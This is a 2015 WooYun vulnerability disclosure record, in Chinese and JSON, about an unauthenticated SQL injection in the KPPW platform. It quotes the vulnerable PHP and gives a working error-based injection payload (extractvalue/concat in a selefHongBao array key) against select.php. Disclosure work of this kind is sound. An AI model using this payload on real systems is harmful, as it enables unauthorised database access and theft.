{"id": 84792, "wybug_id": "wooyun-2015-0141696", "wybug_title": "kppw 最新版前台无条件sql注入一枚", "wybug_corp": "keke.com", "wybug_author": "roker", "wybug_date": "2015-09-18 10:21", "wybug_open_date": "2015-12-17 10:48", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-21：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-11-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-12-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向公众公开  简要描述： rt 详细说明：  /www/lib/inc/CommonClass.php\npublic static function changehongbao($task_id,$moneys,$uid,$money,$title,$g) {\t\t$result=db_factory::get_one('select * from '.TABLEPRE.'witkey_space where uid='.$uid);\t\tif($g){\t\t\t$newbalance=$result['balance']-$money+$moneys;\t\t\tdb_factory::query('update '.TABLEPRE.'witkey_space set balance='.$newbalance.' where uid='.$uid);\t\t\tkeke_finance_class::insert_trust(\"in\", \"task_xg\", $uid, -$money+$moneys, $newbalance);\t\t}else{\t\t\t$newbalance=$result['balance']+$money;\t\t\tkeke_finance_class::insert_trust(\"in\", \"finish_task\", $uid,$money, $newbalance,$task_id);\t\t\tdb_factory::query('update '.TABLEPRE.'witkey_space set balance='.$newbalance.' where uid='.$uid);\t\t\tdb_factory::query('update '.TABLEPRE.'witkey_space set is_hongbao=1 where uid='.$uid);\t\t\tdb_factory::query('update '.TABLEPRE.'witkey_task_work set work_status=4 where uid='.$uid.' and task_id='.$task_id);\t\t}\t\tif(!$g){\t\t\t$v_arr = array (\t\t\t\t\"红包任务\" => '【'.$title.'】',\t\t\t\t\"红包金额\" => $money\t\t);\t\t\tkeke_msg_class::notify_user($uid, $result['username'], 'select', '红包任务完成通知',$v_arr);\t\t}\t\treturn true;\t}\n可以看到uid参数没有单引号包裹带入了查询。看看何处调用了。/www/control/select.php\n......foreach ($cbk as $key => $val) {\t\tdo {\t\t\t$lcg = lcg_value();\t\t} while ($lcg < 0.1);\t\tif (($key + 1) == $count) {\t\t\t$selefHongBao[$val] = $hongbaoSum;\t\t} else {\t\t\t$selefHongBao[$val] = number_format($lcg * $hongbaoSum, 2);\t\t}\t\t$hongbaoSum -= $selefHongBao[$val];\t\t$a += $selefHongBao[$val];\t}\tforeach ($selefHongBao as $k => $v) {\t\tCommonClass::changehongbao($task_id, $task_info[0]['task_cash'], $k, $v, $task_info[0]['task_title']);\t}\tCommonClass::changehongbao('', $task_info[0]['task_cash'], $gUid, $a, $task_info[0]['task_title'], 1);.......\n可以看到 这里调用了。$k来源于 selefHongBao 的键值。然而，这个程序是伪全局的，所以 我们可以添加一个$selefHongBao的键。http://localhost:801/index.php?do=selectpost：\nformhash=1&selefHongBao[111 and extractvalue(1,concat(0x5c,user()))]=1111&task_id=1\n\n\n   漏洞证明：  \n\n   修复方案：  对键值进行过滤。   版权声明：转载请注明来源 roker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-09-18 10:47 厂商回复： 感谢关注 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}